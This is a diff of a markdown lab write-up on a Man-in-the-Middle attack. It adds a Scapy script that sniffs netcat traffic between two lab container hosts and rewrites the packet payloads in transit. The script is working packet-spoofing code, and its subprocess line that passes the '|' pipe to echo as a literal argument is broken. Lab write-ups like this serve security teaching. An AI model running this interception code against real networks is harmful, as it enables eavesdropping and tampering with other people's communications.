@@ -196,9 +196,61 @@ To achieve the above, a series of actions play out: <br/>
 ## Launching an MitM Attack on Netcat
 
 The below code performs a Man-in-the-Middle (MitM) attack on ```Netcat``` traffic between two hosts, Host A and Host B. <br/>
-I do this by modifying the ```Netcat``` data in packets transmitted between them. <br/>
-<br/>
+This time we are changing netcat connections instead of ```telnet``` to allow ```Host M``` to intercept the communications between Hosts A and B and modify the data:
 
+```
+#!/usr/bin/env python3
+import subprocess
+from scapy.all import *
+print("Nigel is intercepting netcat of Nige")
+
+IP_A = "10.9.0.5"
+MAC_A = "02:42:0a:09:00:05"
+IP_B = "10.9.0.6"
+MAC_B = "02:42:0a:09:00:06"
+
+def spoof_pkt(pkt):
+    if pkt[IP].src == IP_A and pkt[IP].dst == IP_B:
+        # Create a new packet based on the captured one.
+        # 1) We need to delete the checksum in the IP & TCP headers,
+        # because our modification will make them invalid.
+        # Scapy will recalculate them if these fields are missing.
+        # 2) We also delete the original TCP payload.
+        newpkt = IP(bytes(pkt[IP]))
+        del(newpkt.chksum)
+        del(newpkt[TCP].payload)
+        del(newpkt[TCP].chksum)
+
+        # Construct the new payload based on the old payload.
+        if pkt[TCP].payload:
+            old_data = str(pkt[TCP].payload.decode())
+            new_data = old_data.replace("Nige", "A" * len("Nige"))
+            new_data = new_data.encode()
+            send(newpkt/new_data)
+        else:
+            send(newpkt)
+    elif pkt[IP].src == IP_B and pkt[IP].dst == IP_A:
+        # Create new packet based on the captured one
+        # Do not make any change
+        newpkt = IP(bytes(pkt[IP]))
+        del(newpkt.chksum)
+        del(newpkt[TCP].chksum)
+        send(newpkt)
+
+# Start netcat listener on Host B
+subprocess.Popen(["nc", "-l", "-p", "1234"])
+
+# Send netcat message from Host A to Host B
+subprocess.Popen(["echo", "Hello, world! This is Nige speaking.", "|", "nc", "10.9.0.6", "1234"])
+
+# Start sniffing packets on Host M
+f = 'tcp'
+pkt = sniff(iface='eth0', filter=f, prn=spoof_pkt)
+```
+
+
+
+### Second Attempt
 ```
 #!/usr/bin/env python3
 from scapy.all import *
@@ -232,7 +284,7 @@ def spoof_packet(packet):
 sniff(filter='tcp and host %s and host %s' % (container_a_ip, container_b_ip), prn=spoof_packet)
 ```
 
-### Second Attempt
+### Third Attempt
 This script replaces each typed character in Telnet with the character 'Z', and also allows for redirecting the TCP packets to a spoofed address. Note that I added a new variable ```IP_M``` for the spoofed IP address and ```MAC_M``` for the spoofed MAC address, and modified the ```spoof_pkt()``` function to create and send the spoofed packets. <br/>
 <br/>
 The script does not necessarily need to start with ```#!/usr/bin/env python3``` as it is not required for the script to run. However, it is a common practice to include this line at the beginning of a Python script so that the operating system can find the Python interpreter and execute the script properly.<br/>
